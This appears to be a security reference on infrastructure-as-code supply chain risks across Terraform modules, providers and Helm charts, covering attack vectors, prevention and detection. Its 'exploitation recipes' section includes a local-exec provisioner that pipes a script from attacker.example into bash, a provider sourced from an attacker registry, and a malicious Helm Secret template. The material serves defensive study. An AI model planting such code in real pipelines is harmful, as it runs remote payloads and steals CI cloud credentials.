# Modules and Supply Chain

Reference for the supply chain of IaC: modules, providers, chart repositories, and the registries that serve them. A compromised module or provider executes in the CI pipeline with the credentials available to the pipeline.

## 1. Overview

An IaC module is a reusable unit of configuration. A provider is a plugin that translates IaC language into cloud API calls. Both are distributed through registries and both run code in the operator's environment.

Supply chain layers:

| Layer | Terraform | CloudFormation | Pulumi | Helm |
|-------|-----------|----------------|--------|------|
| Module | Registry module, git module, local path | Nested stack, macro | Component resource | Chart |
| Provider | Provider plugin (Go binary) | AWS-owned | Provider SDK (Go binary) | N/A |
| Runtime | Terraform binary | AWS CloudFormation engine | Pulumi CLI + language runtime | Helm binary + cluster |
| Registry | registry.terraform.io, private registry | S3 template URL | Pulumi registry, git | OCI, HTTP, git |

Every layer can be substituted with a malicious version. The attack surface is not the IaC file; it is the chain of code the IaC file pulls in.

## 2. Reconnaissance / Enumeration

### Offensive

- **Module source in IaC files.** Grep for `source = "..."` in `.tf` files. Public registry modules are resolved against `registry.terraform.io`. Git modules against arbitrary URLs. Private registries against internal URLs.
- **Lock file.** `.terraform.lock.hcl` records provider versions and hashes but not module versions. Module versions are resolved at `terraform init` unless pinned.
- **Provider requirement.** `required_providers` block. A provider with a `source` pointing to a non-canonical namespace is immediately suspicious.
- **Public module contents.** Any module in the public Terraform registry is visible. Read it, understand what it does at plan time, then decide whether it is a foothold.
- **Registry mirror exposure.** If the org runs a private registry mirror (Artifactory, Nexus), that mirror is a high-value target. A compromise of the mirror affects every pipeline that consumes it.
- **Chart repository exposure.** Helm chart repositories (Bitnami, OCI registries, GitHub Pages) are similar. A chart's `templates/` and `values.yaml` can include `lookup` calls that read cluster secrets.
- **CI logs.** Module versions resolved during `terraform init` are printed. A log leak reveals the exact version of every dependency.

### Defensive

- Inventory every module source referenced across all IaC repositories.
- Confirm the lock file is committed and provider hashes verified.
- Confirm module versions are pinned to a tag or commit SHA, not to `latest` or a branch.
- Confirm the private registry (if any) requires authentication and serves only reviewed content.

## 3. Common Attack Vectors

- **Module takeover.** An abandoned module in the public registry is claimed by an attacker who publishes a malicious version. Pinning to a version tag is not enough if the tag can be moved.
- **Module substitution via `source`.** A `source` URL that resolves through a proxy or a git redirect can serve attacker content.
- **Provider substitution.** `required_providers` with `source = "attacker-registry/aws"` instead of `hashicorp/aws`. Runs at plan time with credentials available.
- **Registry compromise.** A public registry account is compromised. The attacker publishes a new version of a module used by many organizations.
- **Typosquatting.** A module with a name close to a popular one (`terra-form-aws-vpc` instead of `terraform-aws-modules/vpc/aws`).
- **Git submodule hijacking.** Module sources that reference a git submodule. A submodule URL redirect hijack serves attacker content.
- **Chart value injection.** Helm chart with a template that renders `values.yaml` into a `Secret` or a `ServiceAccount` token. Values from a compromised upstream overwrite the operator's values.
- **Dependency confusion.** A public module with the same name as an internal module. The pipeline resolves the public one if the private registry is not first.
- **Provider checksum bypass.** Lock file not committed; the provider is fetched fresh every time and verified against a registry-served checksum that can be replaced.

## 4. Exploitation Recipes

### 4.1 Typosquatting a popular module

```hcl
module "vpc" {
  source = "terraform-aws-modules/vpc/aws"   # legitimate
  # ...
}

module "vpc" {
  source = "terra-form-aws-vpc/aws"          # typosquat
  # ...
}
```

The `terra-form-aws-vpc` module renders the same interface but includes a `provisioner "local-exec"` that runs at apply time.

### 4.2 Malicious module with local-exec

```hcl
# Contents of an attacker-controlled module
resource "null_resource" "bootstrap" {
  provisioner "local-exec" {
    command = "curl -s https://attacker.example/payload.sh | bash"
  }
}
```

At `terraform apply`, the provisioner runs on the CI runner with the runner's environment. If the runner has cloud credentials in environment variables, the payload has access to them.

### 4.3 Provider substitution

```hcl
terraform {
  required_providers {
    aws = {
      source  = "attacker-registry.example.com/hashicorp/aws"
      version = "5.99.0"
    }
  }
}
```

`terraform init` pulls the provider from the attacker registry. The provider binary is executed at plan time and has access to any credentials in `AWS_*` environment variables.

### 4.4 Helm chart value injection

A malicious chart in the upstream repository adds a template that renders a `values.yaml` value into a `Secret` with the cluster-admin token.

```yaml
# malicious template in chart
apiVersion: v1
kind: Secret
metadata:
  name: chart-secret
type: Opaque
data:
  token: {{ .Values.clusterAdminToken | b64enc }}
```

If the operator's `values.yaml` does not set `clusterAdminToken`, the chart renders an empty value. If the chart's default `values.yaml` sets it to an attacker-controlled token, the operator inherits it.

### 4.5 Lock file bypass

`.terraform.lock.hcl` not committed, `terraform init` runs on every CI job. The registry serves a checksum that matches the attacker provider. `terraform init` accepts the provider.

### 4.6 Dependency confusion

If the org has an internal module `internal/iam-policy/aws` and a public module with the same name, the `source` resolution order determines which one is pulled. If `source = "internal/iam-policy/aws"` and the private registry is not first in the search path, the public one wins.

## 5. Post-Exploitation

- **Persist in the pipeline.** A module or provider that runs a `local-exec` at every apply is persistent execution. The module is now part of the configuration.
- **Exfiltrate credentials.** The CI runner has cloud credentials. `local-exec` commands can read environment variables and send them to attacker infrastructure.
- **Modify the plan.** A provider plugin can alter the plan before it is applied. Infrastructure created differs from the configuration.
- **Persist in the registry.** A version of a widely-used module that includes a backdoor is persistent. Every new use of the module includes the backdoor.
- **Lateral movement.** Module authors often have publish access to many modules in the same registry. A single compromised author account is a persistent foothold across every module the author owns.

## 6. Preventive Controls

### Module pinning
- **Pin every module to a specific version.** `version = "5.1.0"` in the `module` block, or a commit SHA for git modules.
- **Pin to a commit SHA, not a branch.** `ref=v5.1.0` is not enough if tags are mutable; `ref=<sha>` is.
- **Vendor modules.** For critical modules, copy the source into the repo and reference it as a local path. This eliminates the registry dependency at `terraform init`.

### Provider pinning
- **Pin `source` to the canonical namespace.** `hashicorp/aws`, `hashicorp/azurerm`, `hashicorp/google`, not aliases.
- **Pin `version` in the `required_providers` block.** Exact version or narrow range.
- **Commit `.terraform.lock.hcl`.** Every CI run verifies provider hashes against the lock file.
- **Private registry mirror.** Pull providers through an internal mirror. Compromised public registry cannot reach the pipeline directly.

### Helm pinning
- **Pin the chart version.** `helm install --version 1.2.3`.
- **Pin the chart digest.** OCI charts support digest pinning.
- **Vendor the chart.** `helm pull` and commit the `.tgz` to the repo.
- **Review the chart's default `values.yaml` and templates.** Specifically look for `lookup`, `local-exec` equivalents, and any template that renders a value into a `Secret`.

### Registry
- **Private registry with authentication.** No anonymous pulls.
- **Registry mirror with approval.** New module versions require review before being mirrored.
- **SBOM and provenance.** SLSA provenance on every module and chart version. Verify before use.

### CI
- **Minimal environment.** No `AWS_*` environment variables on the runner beyond what the apply step needs. Use per-step credential injection.
- **Sandbox the runner.** Ephemeral runners, read-only filesystem except for the workspace, no outbound network except to approved registries.

## 7. Detection Controls

- **Registry audit logs.** Every module pull logged. Alert on modules pulled outside the approved list.
- **Provider download audit.** `.terraform.lock.hcl` compared between runs. A change outside a review window is suspicious.
- **Module version changes.** Any change to a module version in a PR triggers a review. Automated drift detection on the lock file.
- **`local-exec` and `remote-exec` presence.** Any `provisioner` block in a module is suspicious. Alert on PRs that add one.
- **`lookup` in Helm templates.** Any `lookup` call in a chart template is suspicious. Alert on PRs that add one.
- **Runner environment.** Monitor the environment for `local-exec` payloads (curl to unknown hosts, base64 decoding, credential env var access).

## 8. Verification

- [ ] Every module pinned to a version or commit SHA.
- [ ] Every provider pinned to a canonical `source` and exact `version`.
- [ ] `.terraform.lock.hcl` committed and updated only through reviewed PRs.
- [ ] Helm charts pinned to version and digest.
- [ ] No `local-exec` / `remote-exec` provisioners outside an approved list.
- [ ] No `lookup` calls in Helm templates outside an approved list.
- [ ] Private registry with authentication, and a curated mirror for critical modules.
- [ ] SLSA provenance verified on every module version used in production.
- [ ] Registry audit logs reviewed.
- [ ] Ephemeral CI runners with minimal environment.

## 9. Certification Alignment

- **HashiCorp Certified: Terraform Associate:** modules, providers, dependency lock file.
- **AWS Certified DevOps Engineer - Professional:** Domain 2 (Configuration Management and IaC), Domain 3 (Security and Compliance).
- **AWS Certified Security - Specialty:** Domain 3 (Infrastructure Security).
- **Google Cloud Professional Cloud DevOps Engineer:** supply chain, CI/CD.
- **Azure DevOps Engineer Expert (AZ-400):** supply chain security.
- **CompTIA Security+:** Domains 2-4.

## 10. Production Notes

- **Registry availability is a security control.** A registry that is unavailable during a pipeline run blocks the pipeline. This is intentional; it prevents silent adoption of new module versions.
- **Module authors are a supply chain.** A single maintainer with publish rights to many modules is a high-value target. Prefer modules maintained by well-known organizations.
- **`terraform init -upgrade` is dangerous.** It pulls the latest version of every module and provider. Use only in a dedicated upgrade PR, never in CI.
- **`local-exec` runs on the runner, not on the target.** Credentials available to the runner are available to the `local-exec` command. Minimize what the runner has.
- **Helm chart values are inputs.** Treat them as untrusted. A chart that renders a value into a `Secret` gives the chart author read access to that secret at apply time.

## 11. References

- Terraform module sources - https://developer.hashicorp.com/terraform/language/modules/sources
- Terraform provider requirements - https://developer.hashicorp.com/terraform/language/providers/requirements
- Terraform dependency lock file - https://developer.hashicorp.com/terraform/language/files/dependency-lock
- Terraform provisioners - https://developer.hashicorp.com/terraform/language/resources/provisioners/syntax
- Terraform private registry - https://developer.hashicorp.com/terraform/registry/private
- Helm chart repositories - https://helm.sh/docs/topics/chart_repository/
- Helm OCI registries - https://helm.sh/docs/topics/registries/
- SLSA provenance - https://slsa.dev/
- Sigstore / Cosign - https://docs.sigstore.dev/
- NIST SP 800-204D (Securing the Software Supply Chain) - https://csrc.nist.gov/publications/detail/sp/800-204d/final
- OpenSSF Scorecard - https://github.com/ossf/scorecard